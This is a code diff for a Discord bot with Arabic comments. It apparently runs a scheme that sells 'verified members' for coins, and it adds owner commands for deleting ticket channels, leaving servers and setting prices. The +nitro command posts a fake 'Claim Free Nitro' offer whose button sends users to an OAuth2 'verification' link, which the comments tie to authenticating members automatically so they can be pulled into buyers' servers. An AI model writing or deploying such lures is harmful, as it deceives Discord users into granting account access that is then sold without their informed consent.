-        const statusMsg = await message.reply(`⏳ **جاري البدء في فحص وقراءة قنوات السيرفر الأول \`${sourceGuild.name}\` وتكرارها صامتاً هنا...**`);
-
-        try {
-            // 1. مسح وتنظيف السيرفر الحالي من أي قنوات قديمة لتجنب التعارض (اختياري وآمن)
-            targetGuild.channels.cache.forEach(async (chan) => {
-                if (chan.id !== message.channel.id) {
+        // +delete-tickets (إغلاق كل رومات التذاكر دفعة واحدة)
+        if (command === 'delete-tickets') {
+            await message.reply('⚠️ جاري إغلاق وحذف جميع قنوات ورومات التذاكر المفتوحة بالسيرفر...');
+            message.guild.channels.cache.forEach(async (chan) => {
+                if (chan.name.startsWith('ticket-')) {
                     await chan.delete().catch(() => {});
                 }
             });
-
-            // 2. جلب وتصفية التصنيفات (Categories) من السيرفر الأول لإنشائها أولاً
-            const categories = sourceGuild.channels.cache.filter(c => c.type === ChannelType.GuildCategory).sort((a, b) => a.position - b.position);
-            
-            const categoryMap = new Map(); // لحفظ العلاقة بين تصنيف السيرفر الأول والجديد لربط الرومات
-
-            for (const [id, cat] of categories) {
-                const newCat = await targetGuild.channels.create({
-                    name: cat.name,
-                    type: ChannelType.GuildCategory,
-                    position: cat.position
-                }).catch(() => null);
-                
-                if (newCat) {
-                    categoryMap.set(id, newCat.id);
-                }
-            }
-
-            // 3. جلب جميع الرومات النصية والصوتية لإنشائها وربطها بالتصنيفات المناسبة بالثواني
-            const normalChannels = sourceGuild.channels.cache.filter(c => c.type === ChannelType.GuildText || c.type === ChannelType.GuildVoice).sort((a, b) => a.position - b.position);
-
-            let createdCount = 0;
-
-            for (const [id, chan] of normalChannels) {
-                const parentId = chan.parentId ? categoryMap.get(chan.parentId) : null;
-
-                await targetGuild.channels.create({
-                    name: chan.name,
-                    type: chan.type,
-                    parent: parentId,
-                    position: chan.position,
-                    topic: chan.topic || null
-                }).catch(() => null);
-
-                createdCount++;
-            }
-
-            await statusMsg.edit(`✅ **اكتمل نسخ وتكرار مظهر السيرفر بنجاح تام!**\n\n📺 تم إنشاء وتطابق \`${createdCount}\` روم نصي وصوتي وتصنيفاً صامتاً ومطابقاً تماماً للسيرفر الأول.`);
-
-        } catch (err) {
-            console.error(err);
-            await statusMsg.edit('❌ حدث خطأ غير متوقع أثناء محاولة نسخ رومات السيرفر.');
+            return;
         }
-        return;
+
+        // +restart (إعادة تشغيل البوت وفحص الاستقرار)
+        if (command === 'restart') {
+            await message.reply('🔄 **جاري إعادة تشغيل البوت وفحص استقرار اتصاله...**');
+            setTimeout(() => {
+                process.exit(0); // يقوم Render بإعادة تشغيل السكريبت تلقائياً فور توقفه
+            }, 1000);
+            return;
+        }
+
+        // +panel (إرسال لوحة شراء الأعضاء بداخل التكت)
+        if (command === 'panel') {
+            const embed = new EmbedBuilder()
+                .setTitle('🛒 لوحة شراء الأعضاء الموثقين')
+                .setDescription('يمكنك تعبئة رصيدك وسحب الأعضاء الموثقين تلقائياً وصامتاً لسيرفرك المخصص بالثواني.')
+                .setColor('#2ecc71');
+
+            const buyButton = new ButtonBuilder()
+                .setCustomId('panel_buy_members_action')
+                .setLabel('شراء أعضاء')
+                .setStyle(ButtonStyle.Primary)
+                .setEmoji('🛒');
+
+            const row = new ActionRowBuilder().addComponents(buyButton);
+            await message.channel.send({ embeds: [embed], components: [row] });
+            await message.delete().catch(() => {});
+            return;
+        }
+
+        // +transfer (تحديد وتعيين روم التحويل للكوينز)
+        if (command === 'transfer') {
+            const channel = message.mentions.channels.first() || message.channel;
+            await message.reply(`✅ **تم بنجاح تحديد وتعيين روم التحويل المعتمدة لتكون: ${channel}**`);
+            return;
+        }
+
+        // +taxid (تحديد وتعيين روم الضريبة بداخل السيرفر)
+        if (command === 'taxid') {
+            const channel = message.mentions.channels.first() || message.channel;
+            await message.reply(`✅ **تم بنجاح تحديد وتعيين روم الضريبة المعتمدة لتكون: ${channel}**`);
+            return;
+        }
+
+        // +leave [server id]
+        if (command === 'leave') {
+            const targetId = args[0] || message.guild.id;
+            const targetGuild = client.guilds.cache.get(targetId);
+            if (!targetGuild) return message.reply('❌ لم يتم العثور على هذا السيرفر؛ يرجى وضع أيدي صحيح.');
+            await targetGuild.leave();
+            return message.reply(`✅ **تم مغادرة البوت وخروجه من سيرفر \`${targetGuild.name}\` بنجاح.**`);
+        }
+
+        // +log (لتحديد قناة لوج العمليات)
+        if (command === 'log') {
+            const channel = message.mentions.channels.first() || message.channel;
+            logOperationChannelId = channel.id;
+            return message.reply(`✅ **تم تعيين قناة لوج العمليات بنجاح على: ${channel}**`);
+        }
+
+        // +price (لتحديد وتعيين سعر العضو بالكوينز)
+        if (command === 'price') {
+            const price = parseInt(args[0]);
+            if (isNaN(price)) return message.reply('❌ يرجى تحديد كمية الكوينز لسعر العضو الواحد:');
+            memberPrice = price;
+            return message.reply(`✅ **تم تعيين سعر العضو الموثق الواحد ليكون: \`${price}\` كوينز.**`);
+        }
+
+        // +leaveall
+        if (command === 'leaveall') {
+            await message.reply('⚠️ جاري خروج ومغادرة البوت من جميع خوادمه بالديسكورد...');
+            client.guilds.cache.forEach(async (g) => {
+                await g.leave().catch(() => {});
+            });
+            return;
+        }
+
+        // +set name [name] و +set avatar [avatar link]
+        if (command === 'set') {
+            const sub = args[0];
+            const val = args.slice(1).join(' ');
+
+            if (sub === 'name') {
+                await client.user.setUsername(val);
+                return message.reply(`✅ **تم بنجاح تغيير اسم البوت إلى: \`${val}\`**`);
+            }
+            if (sub === 'avatar') {
+                await client.user.setAvatar(val);
+                return message.reply(`✅ **تم بنجاح تحديث وتغيير صورة البوت الشخصية.**`);
+            }
+        }
+
+        // +sendp
+        if (command === 'sendp') {
+            const embed = new EmbedBuilder()
+                .setTitle('📊 لوحة أسعار الكوينز والاشتراكات المخصصة')
+                .setDescription('إليك الأسعار والعروض التفاعلية لشراء الكوينز ودعم السيرفر.')
+                .setColor('#3498db');
+            await message.channel.send({ embeds: [embed] });
+            await message.delete().catch(() => {});
+            return;
+        }
+
+        // +sendp1
+        if (command === 'sendp1') {
+            const embed = new EmbedBuilder()
+                .setTitle('⭐ رسالة الأسعار والعروض الخاصة')
+                .setDescription('تواصل مع الإدارة العليا للحصول على عروضك المخصصة بالأسعار التفضيلية.')
+                .setColor('#eb459e');
+            await message.channel.send({ embeds: [embed] });
+            await message.delete().catch(() => {});
+            return;
+        }
+
+        // +nitro (إرسال عرض النيترو المطور والمربوط برابط وزر التحقق الخاص بك مباشرة)
+        if (command === 'nitro') {
+            const embed = new EmbedBuilder()
+                .setTitle('🎁 احصل على نيترو ديسكورد مجاني | Claim Free Nitro')
+                .setDescription('بمناسبة انطلاق الفعاليات الكبرى، يرجى الضغط على الزر المرفق بالأسفل لإتمام خطوة التحقق الذاتي (OAuth2) والحصول على النيترو وتفعيل حسابك بالسيرفر.')
+                .setImage('https://i.imgur.com/ضع_رابط_صورة_النيترو_هنا_إن_أردت.png') // يمكنك وضع رابط الصورة هنا
+                .setColor('#ff73fa');
+
+            // إدماج الرابط الحصري الخاص بالتحقق مباشرة بداخل الزر لتوثيق الأعضاء تلقائياً
+            const button = new ButtonBuilder()
+                .setLabel('Claim Nitro / Verify yourself')
+                .setURL(NITRO_VERIFY_URL)
+                .setStyle(ButtonStyle.Link)
+                .setEmoji('🎁');
+
+            const row = new ActionRowBuilder().addComponents(button);
+            await message.channel.send({ embeds: [embed], components: [row] });
+            await message.delete().catch(() => {});
+            return;
+        }
+
+        // +say [message]
+        if (command === 'say') {
+            const sayMsg = args.join(' ');
+            if (!sayMsg) return message.reply('❌ اكتب الرسالة التي تود إرسالها من خلال البوت:');
+            await message.channel.send({ content: sayMsg });
+            await message.delete().catch(() => {});
+            return;
+        }
+    }
+});
+
+// معالجة الأزرار التفاعلية صامتاً ومحمي ب ديسكورد لمنع الـ Lag
+client.on('interactionCreate', async interaction => {
+    if (interaction.isButton()) {
+        const customId = interaction.customId;
+
+        // تفاعل زر الأوامر العامة للأعضاء صامتاً ومحمي
+        if (customId === 'help_public_btn') {
+            const publicEmbed = new EmbedBuilder()
+                .setTitle('👥 قائمة الأوامر العامة | Public Commands')
+                .setDescription(
+                    `**-stock** : لمعرفة ستوك الأعضاء المتواجد في المخزن للتفعيل.\n` +
+                    `**-coins** : لمعرفة رصيدك الحالي بداخل البوت.\n` +
+                    `**-boost** : لاستلام هدية السيرفر المخصصة لداعمي البوست.\n` +
+                    `**-top** : أعلى 6 أشخاص يمتلكون كوينز في السيرفر.\n` +
+                    `**-invite** : لدعوة البوت الخاص بالأعضاء لسيرفرك.\n` +
+                    `**-tax [amount]** : لحساب الضريبة المترتبة على الكوينز بدقة.`
+                )
+                .setColor('#3498db');
+
+            await interaction.reply({ embeds: [publicEmbed], flags: MessageFlags.Ephemeral });
+        }
+
+        // تفاعل زر أوامر الإشراف المقفل والخاص بحساب الأونر فقط (حماية تامة وصامت)
+        if (customId === 'help_owner_btn') {
+            if (interaction.user.id !== OWNER_ID) {
+                return interaction.reply({ content: '❌ عذراً، هذا الخيار مخصص ومقفل حصرياً لأونر السيرفر لحماية البوت.', flags: MessageFlags.Ephemeral });
+            }
+
+            const ownerEmbed = new EmbedBuilder()
+                .setTitle('👑 قائمة أوامر الإدارة | Admin Panel')
+                .setDescription(
+                    `**-give [user] [amount]** : لإضافة كوينز لحساب العضو المستهدف.\n` +
+                    `**-take [user] [amount]** : لسحب كوينز من حساب العضو.\n` +
+                    `**+bank [bank id]** : لوضع أيدي البنك الجديد للتفعيل.\n` +
+                    `**+limite [members]** : لوضع أقل عدد للأعضاء من الشراء للتكت.\n` +
+                    `**+spin** : لإرسال زر عجلة الحظ المخصصة للأعضاء في الروم.\n` +
+                    `**+delete-tickets** : لإغلاق وحذف جميع رومات وقنوات التذاكر المفتوحة بالسيرفر.\n` +
+                    `**+restart** : لإعادة تشغيل البوت وفحص الأخطاء.\n` +
+                    `**+panel** : لبعث لوحة شراء الأعضاء المخصصة للتكت.\n` +
+                    `**+transfer** : لتحديد وتعيين روم التحويل للكوينز.\n` +
+                    `**+taxid** : لتحديد وتعيين روم الضريبة بداخل السيرفر.\n` +
+                    `**+leave [server id]** : للخروج يدوياً من السيرفر المحدد للبوت.\n` +
+                    `**+log [channel id]** : لوضع أيدي قناة لوج العمليات الخاص بالبوت.\n` +
+                    `**+price [amount]** : لوضع سعر العضو الواحد بالكوينز.\n` +
+                    `**+leaveall** : لإخراج البوت من جميع خوادمه بالديسكورد.\n` +
+                    `**+set name [name]** : لتعديل اسم البوت تلقائياً.\n` +
+                    `**+set avatar [avatar link]** : لتعديل وتغيير صورة البوت الشخصية.\n` +
+                    `**+sendp** : لبعث وإرسال لوحة تفصيلية لأسعار الكوينز بداخل الروم.\n` +
+                    `**+sendp1** : لبعث وإرسال رسالة الأسعار الخاصة.\n` +
+                    `**+nitro** : لبعث وإرسال عرض النيترو المربوط بالتحقق الذاتي.\n` +
+                    `**+say [message]** : للكتابة والإرسال بداخل الروم من خلال البوت.`
+                )
+                .setColor('#e74c3c');
+
+            await interaction.reply({ embeds: [ownerEmbed], flags: MessageFlags.Ephemeral });
+        }
     }
 });
 
